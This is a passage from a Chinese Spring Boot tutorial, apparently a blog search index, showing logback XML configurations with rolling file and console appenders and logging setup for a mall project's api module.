punctuation">&lt;</span>rollingPolicy</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ch.qos.logback.core.rolling.FixedWindowRollingPolicy<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fileNamePattern</span><span class="token punctuation">&gt;</span></span>log/fixedFile%i.log<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>fileNamePattern</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>minIndex</span><span class="token punctuation">&gt;</span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>minIndex</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>maxIndex</span><span class="token punctuation">&gt;</span></span>10<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>maxIndex</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rollingPolicy</span><span class="token punctuation">&gt;</span></span>        <span class="token comment">&lt;!--SizeBasedTriggeringPolicy--&gt;</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>triggeringPolicy</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ch.qos.logback.core.rolling.SizeBasedTriggeringPolicy<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>maxFileSize</span><span class="token punctuation">&gt;</span></span>5MB<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>maxFileSize</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>triggeringPolicy</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>encoder</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pattern</span><span class="token punctuation">&gt;</span></span>%d{yyyy-MM-dd-HH:mm:ss.SSS} %level[%thread]-%class:%line&gt;&gt;%msg%n            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pattern</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>charset</span><span class="token punctuation">&gt;</span></span>UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>charset</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>encoder</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>appender</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>info<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender-ref</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stdout<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender-ref</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>timeFile<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="27-7-在锋迷商城项目进行日志配置"><a href="#27-7-在锋迷商城项目进行日志配置" class="headerlink" title="27.7 在锋迷商城项目进行日志配置"></a>27.7 在锋迷商城项目进行日志配置</h4><h6 id="27-7-1-在api子工程的resources目录添加日志配置文件"><a href="#27-7-1-在api子工程的resources目录添加日志配置文件" class="headerlink" title="27.7.1 在api子工程的resources目录添加日志配置文件"></a>27.7.1 在api子工程的resources目录添加日志配置文件</h6><ul><li><p>logback-spring.xml</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stdout<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ch.qos.logback.core.ConsoleAppender<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>encoder</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>springProfile</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dev<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pattern</span><span class="token punctuation">&gt;</span></span>%d{yyyy-MM-dd-HH:mm:ss E} %level [%thread]-%class[%line]: %msg%n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pattern</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>springProfile</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>springProfile</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>!dev<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pattern</span><span class="token punctuation">&gt;</span></span>%d{yyyy-MM-dd-HH:mm:ss E} %level [%thread]-%class[%line]: %msg%n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pattern</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>springProfile</span><span class="token punctuation">&gt;</span></span>            <span class="token comment">&lt;!--日志的编码格式--&gt;</span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>charset</span><span class="token punctuation">&gt;</span></span>UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>charset</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>encoder</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>appender</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>timeFile<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ch.qos.logback.core.rolling.RollingFileAppender<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token comment">&lt;!--TimeBasedRollingPolicy  基于时间的滚动策略--&gt;</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rollingPolicy</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ch.qos.logback.core.rolling.TimeBasedRollingPolicy<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>             <span class="token comment">&lt;!--日志文件的存储路径--&gt;</span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fileNamePattern</span><span class="token punctuation">&gt;</span></span>log/log-%d{yyyy-MM-dd-HH}.log<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>fileNamePattern</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rollingPolicy</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>encoder</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pattern</span><span class="token punctuation">&gt;</span></span>%d{yyyy-MM-dd-HH:mm:ss.SSS} %level [%thread]-%class:%line&gt;&gt;%msg%n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pattern</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>charset</span><span class="token punctuation">&gt;</span></span>UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>charset</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>encoder</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>appender</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>info<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender-ref</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stdout<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender-ref</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>timeFile<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h6 id="27-7-2-在sercie实现类创建Logger对象，输入日志"><a href="#27-7-2-在sercie实现类创建Logger对象，输入日志" class="headerlink" title="27.7.2 在sercie实现类创建Logger对象，输入日志"></a>27.7.2 在sercie实现类创建Logger对象，输入日志</h6><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs/1620986837494.png" alt="1620986837494"></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Springboot项目 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
